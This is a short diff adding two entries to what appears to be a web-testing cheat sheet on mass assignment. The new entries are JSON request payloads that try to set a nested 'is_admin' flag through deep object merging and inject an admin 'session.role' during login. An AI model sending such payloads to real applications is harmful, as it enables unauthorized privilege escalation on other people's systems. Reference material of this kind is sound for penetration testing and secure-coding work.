@@ -153,6 +153,28 @@ Content-Type: application/json
     "plan": "premium",
     "balance": 99999
 }
+
+# [NEW] Nested Object Mass Assignment (Clobbering)
+# For apps using deep object merging (e.g. _.merge in Node.js)
+POST /api/profile HTTP/1.1
+{
+    "name": "Hacker",
+    "settings": {
+        "notifications": true,
+        "is_admin": true  // [EXPLOUT] Overwriting a nested protected property
+    }
+}
+
+# [NEW] Mass Assignment on Login / State Change
+# Overwriting session attributes during an update
+POST /api/login HTTP/1.1
+{
+    "username": "hacker",
+    "password": "password",
+    "session": {
+        "role": "admin" // Attempting to inject into the session state
+    }
+}
 ```
 
 ---
